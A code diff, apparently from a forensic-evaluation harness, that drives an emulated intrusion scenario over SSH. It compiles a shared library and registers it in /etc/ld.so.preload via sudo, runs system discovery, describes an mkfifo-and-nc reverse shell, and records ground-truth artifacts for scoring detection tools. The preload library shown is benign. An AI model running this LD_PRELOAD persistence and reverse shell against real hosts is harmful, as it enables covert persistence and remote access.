@@ -5,28 +5,28 @@ Scenario 01 -- LD_PRELOAD infection via /etc/ld.so.preload
 
 Attack narrative
 ----------------
-The attacker gains initial SSH access as an unprivileged user.  They perform
-system discovery, compile a malicious shared library that hooks getuid(3),
-write it to /etc/ld.so.preload, then trigger the hook by spawning a new
-process.  A reverse shell is established from inside that hooked process,
-leaving the .so mapped in memory.  Cleanup optionally reverts each ART test.
+The attacker gains initial SSH access as an unprivileged user. They perform
+system discovery, compile a malicious shared library, write it to
+/etc/ld.so.preload, then trigger the hook by spawning a new process. A reverse
+shell is established from inside that hooked process, leaving the .so mapped in
+memory. Cleanup optionally reverts the scenario-owned disk changes.
 
 Steps
 -----
-1. T1082        -- system info collection -> /tmp/T1082.txt (recorded)
-2. T1574.006    -- compile .so + write /etc/ld.so.preload
+1. T1082        -- scenario-owned system info collection -> /tmp/T1082.txt
+2. T1574.006    -- scenario-owned compile .so + write /etc/ld.so.preload
 3. custom       -- spawn process, verify hook active in /proc/<pid>/maps
 4. T1059.004    -- mkfifo+nc reverse shell (leaves socket + .so in memory)
-5. cleanup only when run_cleanup=True: run each executed ART test's
-   cleanup_command (T1082 removes /tmp/T1082.txt; T1574.006 unhooks
-   /etc/ld.so.preload via sed). The custom steps (trigger, reverse shell) have
-   no ART cleanup. Recorded as a single "cleanup" step.
+5. cleanup only when run_cleanup=True: delete the discovery output and unhook
+   /etc/ld.so.preload via sed. The trigger and reverse shell have no cleanup.
+   Recorded as a single "cleanup" step.
 
 Forensic artifacts
 ------------------
 Disk:
   /etc/ld.so.preload   written by step 2; unhooked (emptied) by cleanup
   /tmp/T1574006.so     compiled .so; NOT removed by cleanup -- persists
+  /tmp/scenario_01_ldpreload/T1574.006.c source used to compile the .so
   /tmp/T1082.txt       discovery output; deleted by cleanup (T1070.004 tombstone)
 
 Memory:
@@ -40,9 +40,8 @@ Each step that plants an artifact records the planted values under a "locators"
 sub-dict with stable keys (e.g. ldpreload -> so_path/preload_path, reverse_shell
 -> fifo/port). These are intent (what the attack put there), kept distinct from
 the observed facts (so_loaded, trigger_pid, connected, ...) recorded alongside.
-The ART-driven paths are read from the atomic at run() time (runner.resolve_arg);
-only the intrinsic preload path and the custom reverse-shell fifo/port are
-module-level constants.
+Paths are owned by the framework. ART is intentionally not part of this
+multi-step scenario; it is only used by the separate art_calibration baseline.
 
 Ground-truth shape
 ------------------
@@ -53,48 +52,21 @@ mid-scenario exception.
 """
 
 from __future__ import annotations
-from functools import partial
-
 from typing import Any
 
-from orchestrator.attacks.art_runner import ArtRunner
-from orchestrator.attacks.helpers import (
-    ArtStep,
-    run_art_step,
-    run_reverse_shell,
-)
+from orchestrator.attacks.helpers import run_reverse_shell
 from orchestrator.core import console
 from orchestrator.core.ssh_client import SSHClient
 from orchestrator.evaluation.scenario.scenario_01 import (
+    DISCOVERY_OUTPUT,
     EVENTS_BY_STEP,
     PRELOAD_PATH,
     RS_FIFO,
     RS_PORT,
+    SO_PATH,
+    SRC_PATH,
     EventCtx,
     record_event,
-)
-
-# --- planted artifact locators -------------------------------------------
-# What the attack plants on disk / in memory. The ART-driven paths (the .so, its
-# .c source, the discovery output) are read from the atomic at run() time via
-# runner.resolve_arg, so the test owns them. PRELOAD_PATH (the intrinsic mechanism
-# of T1574.006, hardcoded in the atomic's command) and the custom reverse-shell
-# fifo/port are not ART-derived; they come from scenario_01 (the GT layer) so the
-# attack and the calibration manifest share one source of truth.
-
-# --- ART step descriptors -----------------------------------------------
-
-_DISCOVERY = ArtStep(
-    name="discovery",
-    technique="T1082",
-    guid="cccb070c-df86-4216-a5bc-9fb60c74e27c",  # List OS Information
-)
-
-_LDPRELOAD = ArtStep(
-    name="ldpreload",
-    technique="T1574.006",
-    guid="39cb0e67-dd0d-4b74-a74b-c072db7ae991",  # /etc/ld.so.preload
-    has_prereq=True,
 )
 
 
@@ -103,7 +75,7 @@ _LDPRELOAD = ArtStep(
 
 def run(
     ssh: SSHClient,
-    runner: ArtRunner,
+    runner: Any,
     host_ip: str,
     internet_on,
     internet_off,
@@ -112,62 +84,25 @@ def run(
     run_cleanup: bool = False,
     gt_builder=None,
 ) -> None:
-    # gt_builder (orchestrator.evaluation.scenario.manifest.GtManifestBuilder) is optional and
-    # purely additive: when present, each seeded action is also recorded into the
-    # GT-blind pipeline's gt_manifest with the wall-clock time at execution. When
-    # absent, behavior is unchanged. The ART-driven atomics keep their fixed
-    # output paths (the upstream atomic owns them); only the custom reverse-shell
-    # port + fifo are randomized from the seed when a builder is supplied.
+    # gt_builder is optional and additive: when present, each seeded action is
+    # also recorded into the GT-blind pipeline's gt_manifest with wall-clock time
+    # at execution. ART is not used here; this scenario owns its attack commands.
     params = gt_builder.params if gt_builder is not None and gt_builder.seed else None
     fifo = f"/tmp/.{params.token()}" if params is not None else RS_FIFO
     port = params.port() if params is not None else RS_PORT
-
-    # ART-owned artifact paths, read from the atomics so they are never hardcoded
-    # here: the discovery output (T1082) and the compiled .so plus its .c source
-    # (T1574.006). PRELOAD_PATH stays a constant (it is baked into the atomic's
-    # command, not an input_argument).
-    discovery_output = runner.resolve_arg(
-        _DISCOVERY.technique, _DISCOVERY.guid, "output_file", _DISCOVERY.input_arguments
-    )
-    so_path = runner.resolve_arg(
-        _LDPRELOAD.technique, _LDPRELOAD.guid, "path_to_shared_library", _LDPRELOAD.input_arguments
-    )
-    so_source = runner.resolve_arg(
-        _LDPRELOAD.technique, _LDPRELOAD.guid, "path_to_shared_library_source", _LDPRELOAD.input_arguments
-    )
 
     # Drive the attacker's commands through one interactive login shell so they
     # are typed into ~/.bash_history, the way a real intrusion leaves them. The
     # reverse shell stays on the exec path (no PTY) so its backgrounded job
     # survives the channel closing.
     ssh.open_shell()
-    _step = partial(
-        run_art_step,
-        runner,
-        internet_on=internet_on,
-        internet_off=internet_off,
-        executor=ssh.run_shell,
-    )
     steps = ground_truth["steps"]
-    # ART tests executed this run, in order. Cleanup reverts each one's
-    # cleanup_command (if any); custom steps (trigger, reverse shell) are not
-    # ART and have no cleanup.
-    art_tests: list[ArtStep] = []
 
-    # Discovery (T1082) writes /tmp/T1082.txt (uname, os-release, uptime), which
-    # persists on disk in a no-cleanup run, so the discovery_output spec covers
-    # it. Record the step so the evaluator scores it: ground_truth must mirror
-    # the spec step names exactly. Best-effort (no raise_on_error): a discovery
-    # failure should not abort the attack.
-    # The live GT shares its event skeleton with the calibration manifest: build
-    # the per-run context once (resolved/randomized locators) and record each
-    # event from EVENTS_BY_STEP at the moment its step executes, so the timestamps
-    # stay wall-clock. record_event with ts_utc unset stamps the current time.
     ctx = EventCtx(
         cleanup=run_cleanup,
-        discovery_output=discovery_output,
-        so_path=so_path,
-        src_path=so_source,
+        discovery_output=DISCOVERY_OUTPUT,
+        so_path=SO_PATH,
+        src_path=SRC_PATH,
         socket_value=f"{host_ip}:{port}",
         fifo=fifo,
     )
@@ -178,17 +113,13 @@ def run(
 
     try:
         console.step_header("[1/4] discovery")
-        discovery = _step(_DISCOVERY)
-        discovery["locators"] = {"output_path": discovery_output}
+        discovery = _run_discovery(ssh)
         steps.append(discovery)
-        art_tests.append(_DISCOVERY)
         _record("E1_discovery_os_info")
 
         console.step_header("[2/4] LD_PRELOAD infection")
-        ldpreload = _step(_LDPRELOAD, raise_on_error=True)
-        ldpreload["locators"] = {"so_path": so_path, "preload_path": PRELOAD_PATH}
+        ldpreload = _install_ldpreload(ssh)
         steps.append(ldpreload)
-        art_tests.append(_LDPRELOAD)
         _record("E2_ldpreload_persistence")
         _record("E2_ldpreload_payload")
 
@@ -206,12 +137,9 @@ def run(
 
         if run_cleanup:
             console.step_header("cleanup")
-            _run_cleanups(runner, art_tests, steps, executor=ssh.run_shell)
+            _run_cleanup(ssh, steps)
             _record("E5_discovery_deleted")
         else:
-            # No cleanup step recorded: with run_cleanup=False the cleanup-phase
-            # specs have nothing to match, so ground_truth carries only the attack
-            # steps (discovery, ldpreload, ldpreload_trigger, reverse_shell).
             console.step_header("cleanup (skipped: artifacts preserved)")
     finally:
         # Flush the typed commands to ~/.bash_history even if a step raised, so
@@ -222,35 +150,86 @@ def run(
 # --- scenario-local helpers ---------------------------------------------
 
 
-def _run_cleanups(
-    runner: ArtRunner,
-    art_tests: list[ArtStep],
-    steps: list[dict[str, Any]],
-    *,
-    executor=None,
-) -> None:
-    # Run each executed ART test's cleanup_command (ArtRunner.run_cleanup no-ops
-    # when none is defined) and record the techniques actually reverted as one
-    # analytic "cleanup" step the cleanup-phase specs bind to. Technique label is
-    # T1070.004 (Indicator Removal: File Deletion): cleanup's net forensic effect
-    # here is deleting the discovery output and unhooking the preload config.
-    reverted: list[str] = []
-    for test in art_tests:
-        if runner.run_cleanup(
-            test.technique,
-            test.guid,
-            input_arguments=test.input_arguments or None,
-            executor=executor,
-        ):
-            reverted.append(test.technique)
+_PRELOAD_SOURCE = r"""
+#include <stdio.h>
+
+static void init(int argc, char **argv, char **envp) {
+    printf("Loaded Scenario 01 preload library successfully!\n");
+}
+
+static void fini(void) {
+    printf("Unloading Scenario 01 preload library...\n");
+}
+
+__attribute__((section(".init_array"), used)) static typeof(init) *init_p = init;
+__attribute__((section(".fini_array"), used)) static typeof(fini) *fini_p = fini;
+""".strip()
+
+
+def _run_discovery(ssh: SSHClient) -> dict[str, Any]:
+    cmd = (
+        f"mkdir -p /tmp/scenario_01_ldpreload; "
+        f"uname -a > {DISCOVERY_OUTPUT}; "
+        f"cat /etc/os-release >> {DISCOVERY_OUTPUT} 2>/dev/null || true; "
+        f"uptime >> {DISCOVERY_OUTPUT}"
+    )
+    code, out = ssh.run_shell(cmd, timeout=15)
+    return {
+        "step": "discovery",
+        "technique": "T1082",
+        "exit_code": code,
+        "stdout": out,
+        "stderr": "",
+        "locators": {"output_path": DISCOVERY_OUTPUT},
+    }
+
+
+def _install_ldpreload(ssh: SSHClient) -> dict[str, Any]:
+    source = _shell_single_quote(_PRELOAD_SOURCE)
+    cmd = (
+        f"mkdir -p /tmp/scenario_01_ldpreload && "
+        f"printf %s {source} > {SRC_PATH} && "
+        f"gcc -shared -fPIC -o {SO_PATH} {SRC_PATH} && "
+        f"sudo sh -c 'echo {SO_PATH} > {PRELOAD_PATH}'"
+    )
+    code, out = ssh.run_shell(cmd, timeout=30)
+    if code != 0:
+        raise RuntimeError(f"LD_PRELOAD install failed: {out.strip()}")
+    return {
+        "step": "ldpreload",
+        "technique": "T1574.006",
+        "exit_code": code,
+        "stdout": out,
+        "stderr": "",
+        "locators": {
+            "so_path": SO_PATH,
+            "source_path": SRC_PATH,
+            "preload_path": PRELOAD_PATH,
+        },
+    }
+
+
+def _run_cleanup(ssh: SSHClient, steps: list[dict[str, Any]]) -> None:
+    cmd = (
+        f"rm -f {DISCOVERY_OUTPUT}; "
+        f"sudo sed -i 's#{SO_PATH}##' {PRELOAD_PATH}"
+    )
+    code, out = ssh.run_shell(cmd, timeout=15)
     steps.append(
         {
             "step": "cleanup",
             "technique": "T1070.004",
-            "reverted": reverted,
+            "exit_code": code,
+            "stdout": out,
+            "stderr": "",
+            "reverted": ["T1082", "T1574.006"],
             "run": True,
         }
     )
+
+
+def _shell_single_quote(value: str) -> str:
+    return "'" + value.replace("'", "'\"'\"'") + "'"
 
 
 def _trigger_hook(ssh: SSHClient) -> dict[str, Any]:
